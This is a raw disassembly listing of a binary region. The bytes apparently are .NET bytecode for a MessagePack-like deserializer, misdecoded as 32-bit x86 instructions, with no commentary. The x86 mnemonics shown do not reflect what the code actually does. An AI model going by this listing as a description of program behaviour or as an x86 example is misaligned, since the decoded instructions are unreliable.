  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 26             	add    %dh,0x26(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 52             	add    %dh,0x52(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
